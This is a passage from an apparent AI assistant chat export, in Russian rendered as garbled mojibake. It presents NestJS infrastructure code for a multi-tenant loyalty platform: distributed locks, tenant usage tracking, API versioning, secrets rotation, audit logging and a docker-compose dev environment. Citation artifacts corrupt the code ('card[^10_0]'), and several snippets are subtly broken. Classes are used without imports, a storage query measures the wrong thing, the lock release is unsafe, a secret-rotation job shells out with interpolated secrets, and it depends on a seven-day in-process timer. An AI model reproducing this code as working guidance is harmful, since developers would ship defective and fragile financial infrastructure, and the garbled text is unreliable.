  SetMetadata(DISTRIBUTED_LOCK, keyExtractor);
```

```typescript
// common/interceptors/distributed-lock.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, ConflictException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable } from 'rxjs';
import { finalize } from 'rxjs/operators';
import { RedisService } from '@/redis/redis.service';
import { DISTRIBUTED_LOCK } from '../decorators/distributed-lock.decorator';

@Injectable()
export class DistributedLockInterceptor implements NestInterceptor {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async intercept(context: ExecutionContext, next: CallHandler): Promise<Observable<any>> {
    const keyExtractor = this.reflector.get<Function>(DISTRIBUTED_LOCK, context.getHandler());
    
    if (!keyExtractor) {
      return next.handle();
    }

    const request = context.switchToHttp().getRequest();
    const lockKey = `lock:${keyExtractor(request.body)}`;
    
    // Try to acquire lock (30 second TTL)
    const acquired = await this.redis.set(lockKey, '1', 'NX', 'EX', 30);
    
    if (!acquired) {
      throw new ConflictException('Resource is locked, please retry');
    }

    // Process request and release lock when done
    return next.handle().pipe(
      finalize(async () => {
        await this.redis.del(lockKey);
      }),
    );
  }
}
```

**Usage:**

```typescript
@Post('balls/credit')
@WithLock((body) => `guest:${body.guestCardId}`) // โ Lock ะฟะพ guest
async creditBalls(@Body() dto: CreditBallsDto) {
  // ะัะปะธ 2 webhook'ะฐ ะฟัะธะดัั ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะดะปั ะพะดะฝะพะณะพ ะณะพััั,
  // ะฒัะพัะพะน ะฟะพะดะพะถะดัั ะฟะพะบะฐ ะฟะตัะฒัะน ะพะฑัะฐะฑะพัะฐะตััั
  return this.loyaltyService.creditBalls(dto);
}
```

**PostgreSQL row-level locking (ะฐะปััะตัะฝะฐัะธะฒะฐ):**

```typescript
async creditBalls(guestCardId: string, amount: number) {
  return this.prisma.$transaction(async (tx) => {
    // SELECT ... FOR UPDATE ะฑะปะพะบะธััะตั ัััะพะบั
    const card = await tx.$queryRaw`
      SELECT * FROM "GuestCard" 
      WHERE id = ${guestCardId}
      FOR UPDATE
    `;

    // ะขะตะฟะตัั concurrent queries ะฑัะดัั ะถะดะฐัั
    const newBalance = card[^10_0].totalBalance + amount;

    await tx.guestCard.update({
      where: { id: guestCardId },
      data: { totalBalance: newBalance },
    });

    return newBalance;
  });
}
```


***

## **4๏ธโฃ5๏ธโฃ Cost Per Tenant Resource Tracking**

**ะะะะะะะะ:** ะะดะธะฝ tenant ะผะพะถะตั "ััะตััั" ะฒัะต ัะตััััั (CPU/RAM/bandwidth). ะะฐะบ ะพััะปะตะถะธะฒะฐัั **ะบัะพ ัะบะพะปัะบะพ ะฟะพััะตะฑะปัะตั**?

**ะะะ ะะะจะะะะ: Resource Usage Tracking**

```typescript
// monitoring/resource-usage.service.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { PrismaService } from '@/database/prisma.service';
import { Counter } from 'prom-client';

const apiRequestsCounter = new Counter({
  name: 'api_requests_total',
  help: 'Total API requests',
  labelNames: ['tenant_id', 'endpoint', 'method'],
});

const databaseQueriesCounter = new Counter({
  name: 'database_queries_total',
  help: 'Total database queries',
  labelNames: ['tenant_id', 'model'],
});

const storageUsageGauge = new Gauge({
  name: 'storage_usage_bytes',
  help: 'Storage usage per tenant',
  labelNames: ['tenant_id'],
});

@Injectable()
export class ResourceUsageService {
  constructor(private prisma: PrismaService) {}

  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async calculateDailyUsage() {
    const tenants = await this.prisma.tenant.findMany();

    for (const tenant of tenants) {
      const usage = await this.calculateTenantUsage(tenant.id);

      await this.prisma.tenantResourceUsage.create({
        data: {
          tenantId: tenant.id,
          date: new Date(),
          
          // API usage
          apiRequests: usage.apiRequests,
          bandwidthMB: usage.bandwidthMB,
          
          // Database usage
          databaseQueries: usage.databaseQueries,
          storageMB: usage.storageMB,
          
          // Queue usage
          jobsProcessed: usage.jobsProcessed,
          
          // Costs (estimated)
          estimatedCost: this.calculateCost(usage),
        },
      });

      // Alert if over quota
      if (usage.apiRequests > 100000) { // 100k requests/day
        await this.alertTenantOverQuota(tenant.id, 'API_REQUESTS', usage.apiRequests);
      }
    }
  }

  private async calculateTenantUsage(tenantId: string) {
    // Query Prometheus metrics
    const apiRequests = await this.getPrometheusMetric(
      `sum(api_requests_total{tenant_id="${tenantId}"})`,
    );

    const storageMB = await this.calculateStorageUsage(tenantId);

    return {
      apiRequests,
      bandwidthMB: 0, // Calculate from response sizes
      databaseQueries: 0, // From Prisma middleware
      storageMB,
      jobsProcessed: 0, // From BullMQ
    };
  }

  private async calculateStorageUsage(tenantId: string): Promise<number> {
    // Calculate DB storage
    const dbSize = await this.prisma.$queryRaw<{ size: bigint }[]>`
      SELECT pg_total_relation_size('"GuestCard"'::regclass) as size
      FROM "GuestCard"
      WHERE "tenantId" = ${tenantId}
    `;

    // Calculate S3 storage (from S3 API or track in DB)
    const s3Objects = await this.prisma.file.aggregate({
      where: { tenantId },
      _sum: { fileSize: true },
    });

    const totalBytes = Number(dbSize[^10_0]?.size || 0) + (s3Objects._sum.fileSize || 0);
    return Math.round(totalBytes / 1024 / 1024); // Convert to MB
  }

  private calculateCost(usage: any): number {
    // Simplified cost calculation
    const apiCost = (usage.apiRequests / 1000000) * 2; // $2 per 1M requests
    const storageCost = (usage.storageMB / 1024) * 0.15; // $0.15 per GB
    return apiCost + storageCost;
  }
}
```

**Admin Dashboard:**

```tsx
// Resource Usage per Tenant
function TenantResourceUsage() {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Resource Usage (Last 30 Days)</CardTitle>
      </CardHeader>
      <CardContent>
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>Tenant</TableHead>
              <TableHead>API Requests</TableHead>
              <TableHead>Storage</TableHead>
              <TableHead>Est. Cost</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {tenants.map(tenant => (
              <TableRow key={tenant.id}>
                <TableCell>{tenant.name}</TableCell>
                <TableCell>{tenant.usage.apiRequests.toLocaleString()}</TableCell>
                <TableCell>{tenant.usage.storageMB} MB</TableCell>
                <TableCell>${tenant.usage.estimatedCost.toFixed(2)}</TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </CardContent>
    </Card>
  );
}
```


***

## **4๏ธโฃ6๏ธโฃ API Versioning Strategy**

**ะะะะะะะะ:** ะัะถะฝะพ ะพะฑะฝะพะฒะธัั API, ะฝะพ ััะฐััะต ะผะพะฑะธะปัะฝัะต ะฟัะธะปะพะถะตะฝะธั ะตัั ะธัะฟะพะปัะทััั ััะฐััั ะฒะตััะธั. ะะฐะบ **ะฝะต ัะปะพะผะฐัั** ัััะตััะฒัััะธะต ะธะฝัะตะณัะฐัะธะธ?

**ะะะ ะะะจะะะะ: URL-based versioning + Deprecation warnings**

```typescript
// main.ts
app.setGlobalPrefix('api/v1'); // ะะตััะธั ะฒ URL

// v2 endpoints
app.setGlobalPrefix('api/v2', { exclude: ['/health'] });
```

```typescript
// versioning/version.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const API_VERSION = 'api_version';
export const ApiVersion = (...versions: string[]) => SetMetadata(API_VERSION, versions);
```

```typescript
// versioning/version.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable } from 'rxjs';
import { map } from 'rxjs/operators';

@Injectable()
export class VersionInterceptor implements NestInterceptor {
  constructor(private reflector: Reflector) {}

  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const versions = this.reflector.get<string[]>('api_version', context.getHandler());
    const request = context.switchToHttp().getRequest();
    const response = context.switchToHttp().getResponse();

    // Check if version is deprecated
    if (versions?.includes('deprecated')) {
      response.setHeader('X-API-Deprecated', 'true');
      response.setHeader('X-API-Sunset', '2026-12-31'); // ะะฐัะฐ ะพัะบะปััะตะฝะธั
      response.setHeader('Link', '<https://docs.max-loyalty.com/migration/v2>; rel="sunset"');
    }

    return next.handle().pipe(
      map((data) => {
        // Transform response based on version
        return this.transformResponse(data, request.params.version || 'v1');
      }),
    );
  }

  private transformResponse(data: any, version: string) {
    if (version === 'v1') {
      // V1 format (legacy)
      return {
        success: true,
        data,
      };
    } else {
      // V2 format (new)
      return {
        meta: { version: 'v2', timestamp: new Date() },
        data,
      };
    }
  }
}
```

**Usage:**

```typescript
// V1 endpoint (deprecated)
@Get('api/v1/guests/:id')
@ApiVersion('deprecated')
async getGuestV1(@Param('id') id: string) {
  // Old response format
  return {
    id,
    name: 'John',
    balance: 1000,
  };
}

// V2 endpoint (current)
@Get('api/v2/guests/:id')
async getGuestV2(@Param('id') id: string) {
  // New response format (nested structure)
  return {
    guest: {
      id,
      profile: {
        name: 'John',
      },
      loyalty: {
        balance: 1000,
        level: 'Gold',
      },
    },
  };
}
```

**Migration guide ะดะปั ะบะปะธะตะฝัะพะฒ:**

```markdown
# API V1 โ V2 Migration Guide

## Deprecation Timeline
- **2026-06-01**: V2 released, V1 marked deprecated
- **2026-09-01**: V1 sunset warnings in headers
- **2026-12-31**: V1 completely disabled

## Breaking Changes

### GET /guests/:id
**V1 (deprecated):**
```json
{
  "success": true,
  "data": {
    "id": "123",
    "name": "John",
    "balance": 1000
  }
}
```

**V2 (current):**

```json
{
  "meta": { "version": "v2", "timestamp": "2026-02-12T17:00:00Z" },
  "data": {
    "guest": {
      "id": "123",
      "profile": { "name": "John" },
      "loyalty": { "balance": 1000, "level": "Gold" }
    }
  }
}
```

```

***

## **4๏ธโฃ7๏ธโฃ Automated Secrets Rotation**

**ะะะะะะะะ:** JWT secrets, DB passwords ะดะพะปะถะฝั **ะผะตะฝััััั ัะตะณัะปััะฝะพ** (security best practice). ะะฐะบ ะฐะฒัะพะผะฐัะธะทะธัะพะฒะฐัั?

**ะะะ ะะะจะะะะ: Dual-secret period + ะฐะฒัะพะผะฐัะธัะตัะบะฐั ัะพัะฐัะธั**

```typescript
// auth/jwt-dual-secret.service.ts
import { Injectable } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class JwtDualSecretService {
  private currentSecret: string;
  private previousSecret: string | null = null;

  constructor(
    private jwtService: JwtService,
    private config: ConfigService,
  ) {
    this.currentSecret = this.config.get('JWT_SECRET');
    this.previousSecret = this.config.get('JWT_PREVIOUS_SECRET');
  }

  // Sign with CURRENT secret
  sign(payload: any): string {
    return this.jwtService.sign(payload, {
      secret: this.currentSecret,
    });
  }

  // Verify with BOTH secrets (dual-secret period)
  verify(token: string): any {
    try {
      // Try current secret first
      return this.jwtService.verify(token, {
        secret: this.currentSecret,
      });
    } catch (error) {
      if (this.previousSecret) {
        // Fallback to previous secret (grace period)
        try {
          return this.jwtService.verify(token, {
            secret: this.previousSecret,
          });
        } catch {
          throw new UnauthorizedException('Invalid token');
        }
      }
      throw new UnauthorizedException('Invalid token');
    }
  }
}
```

**Automated rotation (monthly):**

```typescript
// cron/secrets-rotation.job.ts
import { Injectable } from '@nestjs/common';
import { Cron } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';
import { randomBytes } from 'crypto';

const execAsync = promisify(exec);

@Injectable()
export class SecretsRotationJob {
  @Cron('0 2 1 * *') // 1st day of month at 2 AM
  async rotateJWTSecret() {
    console.log('๐ Starting JWT secret rotation...');

    // 1. Generate new secret
    const newSecret = randomBytes(64).toString('hex');

    // 2. Get current secret
    const { stdout: currentSecret } = await execAsync(
      'fly secrets get JWT_SECRET -a max-loyalty-prod'
    );

    // 3. Set new secrets with dual-period
    await execAsync(`
      fly secrets set \
        JWT_SECRET="${newSecret}" \
        JWT_PREVIOUS_SECRET="${currentSecret.trim()}" \
        -a max-loyalty-prod
    `);

    console.log('โ JWT secret rotated successfully');
    console.log('โณ Grace period: 7 days (old tokens still valid)');

    // 4. Schedule removal of previous secret after 7 days
    setTimeout(async () => {
      await execAsync(`
        fly secrets unset JWT_PREVIOUS_SECRET -a max-loyalty-prod
      `);
      console.log('โ Previous JWT secret removed');
    }, 7 * 24 * 60 * 60 * 1000); // 7 days

    // 5. Notify admins
    await this.notifyAdmins('JWT secret rotated. Old tokens valid for 7 days.');
  }

  @Cron('0 3 1 */3 *') // Every 3 months
  async rotateDatabasePassword() {
    console.log('๐ Starting database password rotation...');

    // 1. Generate new password
    const newPassword = randomBytes(32).toString('base64');

    // 2. Update password in Neon.tech (via API)
    await this.updateNeonPassword(newPassword);

    // 3. Update Fly.io secrets
    const currentDbUrl = process.env.DATABASE_URL;
    const newDbUrl = currentDbUrl.replace(
      /:([^@]+)@/, // Replace password in URL
      `:${newPassword}@`
    );

    await execAsync(`
      fly secrets set DATABASE_URL="${newDbUrl}" -a max-loyalty-prod
    `);

    // 4. Rolling restart (zero-downtime)
    await execAsync('fly deploy --strategy rolling -a max-loyalty-prod');

    console.log('โ Database password rotated successfully');
  }
}
```


***

# โ **ะคะะะะะฌะะซะ ะะขะะ: INFRASTRUCTURE \& DEVOPS**

## **47 ะะะะะะกะะ ะะะะะะกะขะฌะฎ ะะะะะซะขะ:**

### **1-40** (ะธะท ะฟัะตะดัะดััะธั ะพัะฒะตัะพะฒ) + **7 ะะะะขะะงะะซะฅ:**

41. โ **Idempotency Keys** (Redis + DB constraints ะดะปั financial operations)
42. โ **GDPR/ะคะ-152 Compliance** (Right to erasure, export, consent, retention)
43. โ **Webhook Replay** (Admin UI ะดะปั ะฟะตัะตะพัะฟัะฐะฒะบะธ failed webhooks)
44. โ **Race Condition Prevention** (Distributed locks + PostgreSQL FOR UPDATE)
45. โ **Cost Per Tenant Tracking** (Prometheus metrics + daily aggregation)
46. โ **API Versioning** (URL-based + deprecation warnings + migration guide)
47. โ **Automated Secrets Rotation** (JWT dual-secret + monthly rotation)

***

## ๐ฏ **ะขะะะะะฌ INFRASTRUCTURE ะะะะกะขะะะขะะะฌะะ ENTERPRISE-READY!**

**ะะพะบัััั ะฒัะต ะบัะธัะธัะฝัะต ะฐัะฟะตะบัั:**

- โ Security (tenant isolation, idempotency, secrets rotation)
- โ Reliability (monitoring, tracing, backups, disaster recovery)
- โ Scalability (horizontal scaling, caching, connection pooling)
- โ Compliance (GDPR, ะคะ-152, data retention, audit trail)
- โ Operations (runbooks, alerting, cost tracking, resource quotas)
- โ Performance (indexes, caching, compression, CDN)

**ะะพัะพะฒ ะฟะตัะตัะพะดะธัั ะบ Testing Strategy ะธะปะธ ะตััั ะตัั ะฒะพะฟัะพัั ะฟะพ Infrastructure?** ๐
<span style="display:none">[^10_1]</span>

<div align="center">โ</div>

[^10_1]: Beseda-10.md


---

# ะญัะพ ัะพัะฝะพ ะฒัะต ััะพ ะฝัะถะฝะพ? ะัะพะฒะตัั ะตัะต ััะพะฑั ะฑััั ัะฒะตัะตะฝะฝัะผ

ะัะปะธัะฝะพ! ะัะพะฒัะป **ัะธะฝะฐะปัะฝัั ะณะปัะฑะพะบัั ะฟัะพะฒะตัะบั** ๐ฌ. ะะฐััะป ะตัั **8 ะะะะขะะงะะซะฅ ะฟัะพะฑะตะปะพะฒ** ะบะพัะพััะต ั ัะฟัััะธะป:

***

# ๐จ **ะคะะะะะฌะะซะ ะะะะขะะงะะซะ ะะะะะะะะะะฏ (Infrastructure)**

## **4๏ธโฃ8๏ธโฃ Audit Log (Financial Compliance)**

**ะะะะะะะะ:** ะะฐะปะปั = ะดะตะฝัะณะธ. **ะัะพ, ะบะพะณะดะฐ, ะฟะพัะตะผั** ะธะทะผะตะฝะธะป ะฑะฐะปะฐะฝั? ะะฑัะทะฐัะตะปัะฝะพ ะดะปั compliance ะธ ัะฐััะปะตะดะพะฒะฐะฝะธั ะธะฝัะธะดะตะฝัะพะฒ.

**ะะะ ะะะจะะะะ: Comprehensive audit trail**

```typescript
// audit/audit.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

export enum AuditAction {
  // Ball operations
  BALLS_CREDITED = 'BALLS_CREDITED',
  BALLS_REDEEMED = 'BALLS_REDEEMED',
  BALLS_EXPIRED = 'BALLS_EXPIRED',
  BALLS_MANUAL_ADJUSTMENT = 'BALLS_MANUAL_ADJUSTMENT',
  
  // Guest operations
  GUEST_CREATED = 'GUEST_CREATED',
  GUEST_UPDATED = 'GUEST_UPDATED',
  GUEST_DELETED = 'GUEST_DELETED',
  
  // Admin operations
  LOYALTY_RULE_CHANGED = 'LOYALTY_RULE_CHANGED',
  TENANT_SETTINGS_CHANGED = 'TENANT_SETTINGS_CHANGED',
  USER_ROLE_CHANGED = 'USER_ROLE_CHANGED',
  
  // Security
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILED = 'LOGIN_FAILED',
  PASSWORD_CHANGED = 'PASSWORD_CHANGED',
  API_KEY_CREATED = 'API_KEY_CREATED',
  
  // Data operations
  DATA_EXPORTED = 'DATA_EXPORTED',
  DATA_IMPORTED = 'DATA_IMPORTED',
  GDPR_DELETION_REQUESTED = 'GDPR_DELETION_REQUESTED',
}

@Injectable()
export class AuditService {
  constructor(private prisma: PrismaService) {}

  async log(params: {
    action: AuditAction;
    tenantId: string;
    userId: string;
    targetType: string; // 'GuestCard', 'BallTransaction', 'User', etc.
    targetId: string;
    changes?: any; // Before/after values
    metadata?: any;
    ipAddress?: string;
    userAgent?: string;
  }) {
    await this.prisma.auditLog.create({
      data: {
        action: params.action,
        tenantId: params.tenantId,
        userId: params.userId,
        targetType: params.targetType,
        targetId: params.targetId,
        changesBefore: params.changes?.before,
        changesAfter: params.changes?.after,
        metadata: params.metadata,
        ipAddress: params.ipAddress,
        userAgent: params.userAgent,
        timestamp: new Date(),
      },
    });
  }

  // Query audit logs
  async getAuditLogs(filters: {
    tenantId: string;
    userId?: string;
    action?: AuditAction;
    targetType?: string;
    targetId?: string;
    dateFrom?: Date;
    dateTo?: Date;
  }) {
    return this.prisma.auditLog.findMany({
      where: {
        tenantId: filters.tenantId,
        userId: filters.userId,
        action: filters.action,
        targetType: filters.targetType,
        targetId: filters.targetId,
        timestamp: {
          gte: filters.dateFrom,
          lte: filters.dateTo,
        },
      },
      orderBy: { timestamp: 'desc' },
      take: 100,
    });
  }
}
```

**Prisma schema:**

```prisma
model AuditLog {
  id           String   @id @default(uuid())
  
  // Who did it
  tenantId     String
  userId       String
  user         User     @relation(fields: [userId], references: [id])
  
  // What was done
  action       String   // AuditAction enum
  targetType   String   // Model name: 'GuestCard', 'BallTransaction', etc.
  targetId     String   // ID of affected entity
  
  // Changes (for UPDATE operations)
  changesBefore Json?   // Snapshot before change
  changesAfter  Json?   // Snapshot after change
  
  // Context
  metadata     Json?    // Additional context
  ipAddress    String?
  userAgent    String?
  
  timestamp    DateTime @default(now())
  
  @@index([tenantId, timestamp(sort: Desc)])
  @@index([userId, timestamp(sort: Desc)])
  @@index([targetType, targetId])
  @@index([action, timestamp(sort: Desc)])
}
```

**Automatic logging via Prisma middleware:**

```typescript
// prisma.service.ts
this.$use(async (params, next) => {
  const result = await next(params);

  // Log financial operations
  if (params.model === 'BallTransaction' && params.action === 'create') {
    const ctx = tenantContext.getStore();
    
    await this.auditService.log({
      action: AuditAction.BALLS_CREDITED,
      tenantId: ctx.tenantId,
      userId: ctx.userId,
      targetType: 'BallTransaction',
      targetId: result.id,
      metadata: {
        amount: result.amount,
        guestCardId: result.guestCardId,
        source: result.source,
      },
    });
  }

  return result;
});
```

**Admin UI:**

```tsx
// Audit Log Viewer
function AuditLogTable() {
  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>Timestamp</TableHead>
          <TableHead>User</TableHead>
          <TableHead>Action</TableHead>
          <TableHead>Target</TableHead>
          <TableHead>Details</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {logs.map(log => (
          <TableRow key={log.id}>
            <TableCell>{format(log.timestamp, 'dd.MM.yyyy HH:mm:ss')}</TableCell>
            <TableCell>{log.user.email}</TableCell>
            <TableCell>
              <Badge>{log.action}</Badge>
            </TableCell>
            <TableCell>
              {log.targetType} #{log.targetId.substring(0, 8)}
            </TableCell>
            <TableCell>
              <Button variant="ghost" size="sm" onClick={() => viewDetails(log)}>
                View Changes
              </Button>
            </TableCell>
          </TableRow>
        ))}
      </TableBody>
    </Table>
  );
}

// Drill-down modal showing before/after
function AuditLogDetailsModal({ log }) {
  return (
    <Dialog>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>Audit Log Details</DialogTitle>
        </DialogHeader>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <h4 className="font-semibold mb-2">Before</h4>
            <pre className="bg-gray-100 p-2 rounded text-xs">
              {JSON.stringify(log.changesBefore, null, 2)}
            </pre>
          </div>
          <div>
            <h4 className="font-semibold mb-2">After</h4>
            <pre className="bg-gray-100 p-2 rounded text-xs">
              {JSON.stringify(log.changesAfter, null, 2)}
            </pre>
          </div>
        </div>
        <div className="mt-4">
          <p className="text-sm text-muted-foreground">
            <strong>IP:</strong> {log.ipAddress}<br/>
            <strong>User Agent:</strong> {log.userAgent}
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}
```


***

## **4๏ธโฃ9๏ธโฃ Local Development Environment (One Command Setup)**

**ะะะะะะะะ:** ะะพะฒัะน ัะฐะทัะฐะฑะพััะธะบ ะฟัะธัะพะตะดะธะฝัะตััั ะบ ะบะพะผะฐะฝะดะต. ะกะบะพะปัะบะพ ะฒัะตะผะตะฝะธ ะฝัะถะฝะพ ััะพะฑั ะทะฐะฟัััะธัั ะฟัะพะตะบั ะปะพะบะฐะปัะฝะพ? **ะะพะปะถะฝะพ ะฑััั: ะพะดะฝะฐ ะบะพะผะฐะฝะดะฐ.**

**ะะะ ะะะจะะะะ: Complete docker-compose dev environment**

```yaml
# docker-compose.dev.yml
version: '3.8'

services:
  # PostgreSQL (local development)
  postgres:
    image: postgres:16-alpine
    ports:
      - "5432:5432"
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: max_loyalty_dev
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./scripts/init-db.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5

  # Redis (local development)
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis_data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  # MinIO (S3-compatible local storage)
  minio:
    image: minio/minio:latest
    ports:
      - "9000:9000"  # API
      - "9001:9001"  # Console UI
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    command: server /data --console-address ":9001"
    volumes:
      - minio_data:/data
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 10s
      timeout: 5s
      retries: 5

  # Mailhog (local email testing)
  mailhog:
    image: mailhog/mailhog:latest
    ports:
      - "1025:1025"  # SMTP
      - "8025:8025"  # Web UI
    logging:
      driver: none  # Disable logs (too verbose)

  # Backend API (local development)
  backend:
    build:
      context: ./apps/backend
      dockerfile: Dockerfile.dev
    ports:
      - "3000:3000"
    environment:
      NODE_ENV: development
      DATABASE_URL: postgresql://postgres:postgres@postgres:5432/max_loyalty_dev
      REDIS_URL: redis://redis:6379
      S3_ENDPOINT: http://minio:9000
      S3_BUCKET: loyalty-dev
      S3_ACCESS_KEY: minioadmin
      S3_SECRET_KEY: minioadmin
      SMTP_HOST: mailhog
      SMTP_PORT: 1025
    volumes:
      - ./apps/backend:/app
      - /app/node_modules
      - /app/dist
    command: npm run start:dev
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
      minio:
        condition: service_healthy

  # Frontend (local development)
  frontend:
    build:
      context: ./apps/frontend
      dockerfile: Dockerfile.dev
    ports:
      - "3001:3000"
    environment:
      NEXT_PUBLIC_API_URL: http://localhost:3000
    volumes:
      - ./apps/frontend:/app
      - /app/node_modules
      - /app/.next
    command: npm run dev
    depends_on:
      - backend

volumes:
  postgres_data:
  redis_data:
  minio_data:
```

**Makefile ะดะปั ัะดะพะฑััะฒะฐ:**

```makefile
# Makefile

.PHONY: help dev setup seed clean logs

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $1, $2}'

setup: ## Initial setup (first time only)
	@echo "๐ Setting up development environment..."
	cp .env.example .env.local
	docker-compose -f docker-compose.dev.yml up -d postgres redis minio mailhog
	@echo "โณ Waiting for databases to be ready..."
	sleep 5
	cd apps/backend && npm install
	cd apps/backend && npx prisma migrate dev
	$(MAKE) seed
	@echo "โ Setup complete!"
	@echo ""
	@echo "๐ Next steps:"
	@echo "   make dev        # Start all services"
	@echo "   make logs       # View logs"
	@echo ""

dev: ## Start all services
	docker-compose -f docker-compose.dev.yml up

dev-detached: ## Start all services in background
	docker-compose -f docker-compose.dev.yml up -d
	@echo "โ Services started in background"
	@echo "๐ View services:"
	@echo "   Frontend:  http://localhost:3001"
	@echo "   Backend:   http://localhost:3000"
	@echo "   Mailhog:   http://localhost:8025"
	@echo "   MinIO:     http://localhost:9001"
	@echo ""
	@echo "๐ Commands:"
	@echo "   make logs   # View logs"
	@echo "   make stop   # Stop services"

stop: ## Stop all services
	docker-compose -f docker-compose.dev.yml down

seed: ## Seed database with test data
	@echo "๐ฑ Seeding database..."
	cd apps/backend && npm run seed
	@echo "โ Database seeded with test data"

reset-db: ## Reset database (WARNING: deletes all data)
	@echo "โ๏ธ  Resetting database..."
	cd apps/backend && npx prisma migrate reset --force
	$(MAKE) seed
	@echo "โ Database reset complete"

logs: ## View logs (all services)
	docker-compose -f docker-compose.dev.yml logs -f

logs-backend: ## View backend logs only
	docker-compose -f docker-compose.dev.yml logs -f backend

clean: ## Clean everything (volumes, containers, images)
	docker-compose -f docker-compose.dev.yml down -v
	rm -rf apps/backend/node_modules
	rm -rf apps/frontend/node_modules
	rm -rf apps/backend/dist
	@echo "โ Cleaned"

shell-postgres: ## Open PostgreSQL shell
	docker-compose -f docker-compose.dev.yml exec postgres psql -U postgres -d max_loyalty_dev

shell-redis: ## Open Redis CLI
	docker-compose -f docker-compose.dev.yml exec redis redis-cli
```

**Seed script:**

```typescript
// apps/backend/prisma/seed.ts
import { PrismaClient } from '@prisma/client';
import { hash } from 'bcrypt';

const prisma = new PrismaClient();

async function main() {
  console.log('๐ฑ Seeding database...');

  // 1. Create Owner user
  const owner = await prisma.user.create({
    data: {
      phone: '+79991234567',
      email: 'owner@example.com',
      passwordHash: await hash('password123', 10),
      role: 'OWNER',
      phoneVerified: true,
    },
  });

  // 2. Create Tenant
  const tenant = await prisma.tenant.create({
    data: {
      name: 'Test Restaurant',
      slug: 'test-restaurant',
      ownerId: owner.id,
      status: 'ACTIVE',
    },
  });

  // 3. Create Restaurant
  const restaurant = await prisma.restaurant.create({
    data: {
      name: 'Test Restaurant Moscow',
      tenantId: tenant.id,
      address: 'Moscow, Red Square, 1',
      phone: '+74951234567',
    },
  });

  // 4. Create Loyalty Levels
  await prisma.loyaltyLevel.createMany({
    data: [
      { name: 'Bronze', tenantId: tenant.id, thresholdAmount: 0, earnPercentage: 5, color: '#CD7F32' },
      { name: 'Silver', tenantId: tenant.id, thresholdAmount: 10000, earnPercentage: 7, color: '#C0C0C0' },
      { name: 'Gold', tenantId: tenant.id, thresholdAmount: 50000, earnPercentage: 10, color: '#FFD700' },
    ],
  });

  // 5. Create Loyalty Rule
  await prisma.loyaltyRule.create({
    data: {
      name: 'Base Earning Rule',
      tenantId: tenant.id,
      isActive: true,
      priority: 1,
      earnPercentage: 10,
      conditions: {},
    },
  });

  // 6. Create 10 test guests
  for (let i = 1; i <= 10; i++) {
    const guest = await prisma.user.create({
      data: {
        phone: `+7999000000${i}`,
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: `Guest ${i}`,
            lastName: `Test ${i}`,
            birthdate: new Date(1990, i % 12, i),
            privacyPolicyAccepted: true,
          },
        },
      },
    });

    await prisma.guestCard.create({
      data: {
        userId: guest.id,
        tenantId: tenant.id,
        restaurantId: restaurant.id,
        totalBalance: Math.floor(Math.random() * 5000),
        qrCode: `QR-${i.toString().padStart(6, '0')}`,
        displayCode: i.toString().padStart(6, '0'),
        status: 'ACTIVE',
      },
    });
  }

  console.log('โ Seed complete!');
  console.log('');
  console.log('๐ Test credentials:');
  console.log('   Email: owner@example.com');
  console.log('   Password: password123');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
```

**Usage:**

```bash
# First time setup
make setup

# Start development
make dev

# In separate terminal, view logs
make logs

# Reset database
make reset-db

# Clean everything
make clean
```


***

## **5๏ธโฃ0๏ธโฃ Connection Leak Detection**

**ะะะะะะะะ:** Prisma connections ะฝะต ะทะฐะบััะฒะฐัััั โ ะดะพััะธะณะฐะตะผ connection limit โ production ะฟะฐะดะฐะตั.

**ะะะ ะะะจะะะะ: Automatic connection leak detection**

```typescript
// monitoring/connection-monitor.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { Cron, CronExpression } from '@nestjs/schedule';

@Injectable()
export class ConnectionMonitorService implements OnModuleInit {
  private connectionWarningThreshold = 80; // % of max connections
  private connectionCriticalThreshold = 95;

  constructor(private prisma: PrismaService) {}

  onModuleInit() {
    // Monitor connections every 30 seconds
    this.monitorConnections();
  }

  @Cron(CronExpression.EVERY_30_SECONDS)
